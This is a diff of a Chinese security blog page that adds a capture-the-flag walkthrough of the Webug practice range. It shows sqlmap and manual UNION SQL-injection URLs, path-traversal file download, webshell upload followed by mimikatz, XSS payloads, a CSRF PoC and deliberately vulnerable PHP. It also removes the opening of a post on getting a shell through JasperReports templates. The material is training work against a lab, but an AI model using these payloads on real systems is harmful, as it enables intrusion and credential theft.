@@ -296,6 +296,280 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/10/24/Webug渗透基础教程/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/10/24/Webug渗透基础教程/" itemprop="url">
+                  Webug渗透基础教程
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-10-24T16:14:18+08:00">
+                2017-10-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/10/24/Webug渗透基础教程/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/10/24/Webug渗透基础教程/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/10/24/Webug渗透基础教程/" class="leancloud_visitors" data-flag-title="Webug渗透基础教程">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>####普通的GET注入</p>
+<p>解法一：使用sqlmap</p>
+<p>1）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -b –current-db –current-user</p>
+<p>可以看到当前的数据库名称以及用户名称</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-1.png" alt="webug1-1"></p>
+<p>2）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab –tables</p>
+<p>可以看到pentesterlab中有那些数据表</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-2.png" alt="img"></p>
+<p>3）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab -T flag –columns</p>
+<p>显示出该表下的所有列</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-3.png" alt="img"></p>
+<p>4）sqlmap -u”<a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=1</a>“ -D pentesterlab -T flag -C flag –dump</p>
+<p>得到flag:204f704fbbcf6acf398ffee11989b377</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-4.png" alt="img"></p>
+<p>解法二：手工进行注入</p>
+<p>1）先通过order by 子句判断有几个字段。</p>
+<p><a href="http://172.16.193.128" target="_blank" rel="external">http://172.16.193.128</a>/pentest/test/sqli/sqltamp.php?gid=1’ order by 1 –+</p>
+<p>当order by 后加数字为5的时候报错因而判断有4个表</p>
+<p>2）爆数据库</p>
+<p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database() –+</p>
+<p>3）爆表名</p>
+<p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c6167 –+</p>
+<p>4）爆列名</p>
+<p><a href="http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1" target="_blank" rel="external">http://172.16.193.128/pentest/test/sqli/sqltamp.php?gid=-1</a>‘ UNION SELECT 1,2,3,group_concat(id,0x5e,flag) from flag –+</p>
+<p>参考：</p>
+<p><a href="http://www.freebuf.com/articles/web/29942.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/29942.html</a></p>
+<p><a href="http://www.cnblogs.com/zlgxzswjy/p/6707433.html" target="_blank" rel="external">http://www.cnblogs.com/zlgxzswjy/p/6707433.html</a></p>
+<p>####从图片中你能找到什么？</p>
+<p>1）首先从网站下载这个图片，之后你可以选择用winhex（windows平台使用）分析或者使用binwalk（linux平台）来分析，这里使用binwalk</p>
+<p>2）先看看文件的构成，可以看到是有一个rar格式的文件在里面的</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-5.png" alt="img"></p>
+<p>3）分离文件（当然你把文件后缀修改为rar也是可以的）</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-6.png" alt="img"></p>
+<p>4）直接看123.txt的内容是：密码是123。之后post这个密码就好</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-7.png" alt="img"></p>
+<p>他题没有出好，咱们的思路是没有问题的。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-8.png" alt="img"></p>
+<p>####你看到了什么？</p>
+<p>1）题目不明确的时候就看源码，源码注释部分有扫目录的提示</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-9.png" alt="img"></p>
+<p>2）使用工具扫描目录</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-10.png" alt="img"></p>
+<p>其实这里存在一个小技巧，如果对方没有设置好apache的话会出现列目录的情况，这往往会泄露信息</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-11.png" alt="img"></p>
+<p>3）看一眼诡异的test</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-12.png" alt="img"></p>
+<p>4）然后就解答了</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-13.png" alt="img"></p>
+<p>####告诉你了FLANG是5位数</p>
+<p>1）分析：先看源码无提示；再考虑注册等功能发现无解；最后考虑爆破</p>
+<p>2）爆破无验证码所以使用burpsuite（此处示例使用）或者AWVS等工具均可，若有验证码则要考虑自己编写脚本。最后可以发现爆破结果为admin：admin123</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-14.png" alt="img"></p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-15.png" alt="img"></p>
+<p>3）登录发现没有flag（其实也是题目的问题，我们阅读源码即可发现）</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-16.png" alt="img"></p>
+<p>####一个优点小小的特殊的注入</p>
+<p>1）提示头注入，所以直接使用sqlmap进行注入，首先burp抓包然后保存在sqlmap中</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-17.png" alt="img"></p>
+<p>2）分析：头注入可能出现的几个位置：X-Forwarded-For、User-agent、Referer、Cookie。此处没有出现X-Forwarded-For所以我将其加上先进行这个点的测试。运气不错直接报错。接下来进行注入，与第一题的手工注入过程类似进行注入即可，或者使用sqlmap进行注入（注入命令为：python .\sqlmap.py -r .\test.txt -p “X-Forwarded-For”   text.txt文件的内容为你抓的包）。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-18.png" alt="img"></p>
+<p>最后成功注入得到flag</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/webug1-19.png" alt="img"></p>
+<p>注释：其实你手里是有源代码的，源码看下从白盒角度分析你就可以得到tips在哪儿。这里是基础代码审计不过多解释(代码审计可以借助一些工具的比如我最喜欢的cobra)。</p>
+<p>一下是使用cobra检测的结果：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-10-22%20%E4%B8%8B%E5%8D%888.44.47.png" alt="img"></p>
+<p>####这关需要RMB购买哦</p>
+<p>1）点开可以看到只有一个登陆框，查看源代码看是否有tips,</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-22%20%E4%B8%8B%E5%8D%888.51.55.png" alt="屏幕快照 2017-10-22 下午8.51.55"></p>
+<p>果真是有提示的：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-22%20%E4%B8%8B%E5%8D%889.02.58.png" alt="屏幕快照 2017-10-22 下午9.02.58"></p>
+<p>2）跟着提示走，猜测是否可能为注入，但是当我访问链接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest/test/2/index.php?url=123</div></pre></td></tr></table></figure>
+<p>却出现了弹出并显示成功跳转，没啥用，还是看下账号密码吧，第一题注入也可以看到这个账号密码。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-22%20%E4%B8%8B%E5%8D%889.05.03.png" alt="屏幕快照 2017-10-22 下午9.05.03"></p>
+<p>3）账号：密码&gt;&gt;&gt;tom:123456登陆抓包可以控制金额进行买卖</p>
+<p>####越权</p>
+<p>1）让修改密码所以目标就很明确了，我要越权修改别人的密码</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-22%20%E4%B8%8B%E5%8D%8810.11.33.png" alt="屏幕快照 2017-10-22 下午10.11.33"></p>
+<p>8.csrf</p>
+<p>题目已经提示了是csrf所以我门使用burpsuite抓包然后直接生成PoC即可。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8A%E5%8D%8810.39.23.png" alt="屏幕快照 2017-10-24 上午10.39.23"></p>
+<p>我们可以来测试一下效果：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8A%E5%8D%8810.42.42.png" alt="屏幕快照 2017-10-24 上午10.42.42"></p>
+<p>首先我们访问我们的PoC</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8A%E5%8D%8810.42.57.png" alt="屏幕快照 2017-10-24 上午10.42.57"></p>
+<p>之后点击submit便可以看到提示修改密码成功：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8A%E5%8D%8810.43.04.png" alt="屏幕快照 2017-10-24 上午10.43.04"></p>
+<p>####URL跳转</p>
+<p>看到题目的提示我突然想到前面在源码中看到的一个提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;index.php?url=#&quot;&gt;I&lt;/a&gt;</div></pre></td></tr></table></figure>
+<p>从这里顿时想到了跳转的原理，所以我们只需要这样做就可以访问百度了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">172.16.188.129/pentest/test/5/index.php?url=https://www.baidu.com/</div></pre></td></tr></table></figure>
+<p>####文件下载</p>
+<p>直接访问发现是404，感觉有问题，还以为是要扫描发现某些文件，但发现不是，便去服务器看了下题目源码：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/92017-10-24%20%E4%B8%8A%E5%8D%8810.54.40.png" alt="屏幕快照 2017-10-24 上午10.54.40"></p>
+<p>可以看到这个index.php是有问题的，所以我们直接看download.php即可</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/102017-10-24%20%E4%B8%8A%E5%8D%8810.59.28.png" alt="屏幕快照 2017-10-24 上午10.59.28"></p>
+<p>觉得没有方向的话还是先看源码或者抓包看有没有提示，很巧在源码中我们可以看到有个tips：帮管理员找回mysql帐号密码。通过文件下载找管理员密码，那么可以判断此处应该是任意文件下载漏洞。而要找到管理员的密码我们肯定是要先下载数据库配置文件之后看情况来判断是否需要下载数据库文件。通过之前那个题我们知道这个靶场的apache没有配置好导致文件路径泄漏的问题。所以我们来手动翻一翻。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/112017-10-24%20%E4%B8%8A%E5%8D%8811.08.29.png" alt="屏幕快照 2017-10-24 上午11.08.29"></p>
+<p>发现data这个路径下什么都没有，所以是不是可能存在一个跟data同级的目录（其实刚才看源码我都看到了）</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/122017-10-24%20%E4%B8%8A%E5%8D%8811.10.34.png" alt="屏幕快照 2017-10-24 上午11.10.34"></p>
+<p>成功发现config.php，之后我们构造PoC进行下载：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest//test/6/1/download.php?fname=../../../pentest/test/6/1/db/config.php</div></pre></td></tr></table></figure>
+<p>之后打开就可以找到密码了，并不需要进一步对数据库做什么。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/132017-10-24%20%E4%B8%8A%E5%8D%8811.13.29.png" alt="屏幕快照 2017-10-24 上午11.13.29"></p>
+<p>####我和上题有点像</p>
+<p>这个和上面几乎一样，只不过参数的提交方式变了而已，我们用burp抓包然后修改pic参数即可。</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/12017-10-24%20%E4%B8%8A%E5%8D%8811.54.08.png" alt="屏幕快照 2017-10-24 上午11.54.08"></p>
+<p>####我系统密码忘记了</p>
+<p>1）使用账号密码：tom；123456进行登录，登录后发现可以上传文件，所以便尝试上传webshell</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/22017-10-24%20%E4%B8%8B%E5%8D%8812.00.24.png" alt="屏幕快照 2017-10-24 下午12.00.24"></p>
+<p>2）发现没有任何过滤，所以之后使用cknife进行连接</p>
+<p>3）上传mimikatz抓取管理员密码即可</p>
+<p>####xss</p>
+<p>无任何过滤的一个反射型xss</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://172.16.188.129/pentest/test/9/?id=%3Cscript%3Ealert(%27npusec%27)%3C/script%3E</div></pre></td></tr></table></figure>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/32017-10-24%20%E4%B8%8B%E5%8D%8812.12.35.png" alt="屏幕快照 2017-10-24 下午12.12.35"></p>
+<p>####存储型xss</p>
+<p>也是不存在任何的过滤，只需要在留言处填写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(/npusec/)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/42017-10-24%20%E4%B8%8B%E5%8D%8812.16.02.png" alt="屏幕快照 2017-10-24 下午12.16.02"></p>
+<p>####什么？图片上传不了？</p>
+<p>1）上传一张图片</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/62017-10-24%20%E4%B8%8B%E5%8D%883.05.40.png" alt="屏幕快照 2017-10-24 下午3.05.40"></p>
+<p>2）上传php脚本</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/72017-10-24%20%E4%B8%8B%E5%8D%883.05.56.png" alt="屏幕快照 2017-10-24 下午3.05.56"></p>
+<p>3）不能是图片还不能是脚本，我们看下处理的逻辑：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>],<span class="string">"image"</span>)&amp;&amp;strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"php"</span>))&#123;</div><div class="line"> </div><div class="line"> <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</div><div class="line">    &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">    move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</div><div class="line">    <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"png"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"jpeg"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"bmp"</span>)||strstr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>],<span class="string">"gif"</span>))&#123;</div><div class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='red'&gt;你真的上传了图片,可是这张图片我不喜欢,能换张吗?&lt;/font&gt;"</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"> <span class="keyword">echo</span> <span class="string">"&lt;font color='blue'&gt;你居然不上传图片,宝宝怒了!!&lt;/font&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr/&gt;"</span>;</div></pre></td></tr></table></figure>
+<p>4）根据代码来判断文件的type要为image、其次文件name要有php：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/82017-10-24%20%E4%B8%8B%E5%8D%883.14.16.png" alt="屏幕快照 2017-10-24 下午3.14.16"></p>
+<p>####明天双十一</p>
+<p>源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(strstr($url,<span class="string">"www.taobao.com"</span>))&#123;</div><div class="line">		<span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_HOST'</span>]==<span class="string">"10.10.10.10"</span>)&#123;</div><div class="line">		<span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</div><div class="line">		<span class="keyword">if</span>(strstr($_SERVER[<span class="string">'HTTP_REFERER'</span>],<span class="string">"www.baidu.com"</span>))&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"剁手了，请记录截图!!!flag:83242lkjKJ(*&amp;*^*&amp;k0"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"不想剁手了"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"nono"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"哎呀，这里只允许10.10.10.10访问！！！"</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"这个地方剁手不好，换个地方！"</span>;</div><div class="line">	&#125;</div></pre></td></tr></table></figure>
+<p>一目了然，只需要将几个关键地方设置正确即可：</p>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/52017-10-24%20%E4%B8%8B%E5%8D%883.01.40.png" alt="屏幕快照 2017-10-24 下午3.01.40"></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/10/24/南京邮电CTF题解/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1879,177 +2153,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/Hacking-JasperReports-隐藏shell的特征/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="ZEROYU">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="ZEROYU">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/01/22/Hacking-JasperReports-隐藏shell的特征/" itemprop="url">
-                  Hacking JasperReports-隐藏shell的特征
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:59:14+08:00">
-                2017-01-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2017/01/22/Hacking-JasperReports-隐藏shell的特征/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/Hacking-JasperReports-隐藏shell的特征/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/01/22/Hacking-JasperReports-隐藏shell的特征/" class="leancloud_visitors" data-flag-title="Hacking JasperReports-隐藏shell的特征">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>不久前，我的同事跟我在对一个客户端进行渗透测试。我们确实发现的一件事是,他们留下了几个联网的JasperReports服务器。寻找默认管理帐户的用户名并没有花费太多的精力。<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/login.png?w=960" alt="login"></p>
-<p>也没有用多久我们就猜解出密码是“jasperadmin”</p>
-<p>我从前听过JasperReports但从来没有碰到过要对它进行渗透测试。一个快速的google搜索也没有对前期工作产生多大的作用。尽管这个管理界面很不常见但是它也没有摆脱以某种方式来执行代码，所以顺利成章的我们开始在渗透旅程中把JasperReports渗透测试添加进“容易成功”的列表。</p>
-<h4 id="代码和小脚本"><a href="#代码和小脚本" class="headerlink" title="代码和小脚本"></a>代码和小脚本</h4><p>JasperReports的目的是提取数据从各种各样的来源，例如：databases, xml, flat files等等，并且基于用户定义的模板用某种方式生成一份漂亮的报告。模板在JasperReports被定义为“JRXML”文件，任何拥有创建编辑报告权限的用户都可以上传它。</p>
-<p>JasperReports的设计者允许数据在被包含在报告之前自定义操作。接下来就是利用一些小技巧用Java来编写一段脚本！我想也许你会看到这个。</p>
-<p>我们的目标呢，就是创建一个报告模板（JRXML file）当然是依旧定制的恶意脚本，当它运行时，我们可以收到一个shell。这篇文章的其余部分将会详细描述我们是如何将脚本和报告模板联系到一起的。</p>
-<h4 id="编辑模板"><a href="#编辑模板" class="headerlink" title="编辑模板"></a>编辑模板</h4><p>我们仅仅编辑一个存在的模板而不是创建一个。以下是我们将使用的模板。注意一下，过于复杂以及其中的90%是完全不必要的。下面这个只是一个带有“JasperStudio”的简单样本报告。35–42行是有趣的一个部分，我在这个部分插入了“ShellScriptlet”。</p>
-<p>shell.jrxml</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</div><div class="line"><span class="comment">&lt;!-- Created with Jaspersoft Studio version 6.0.1.final using JasperReports Library version 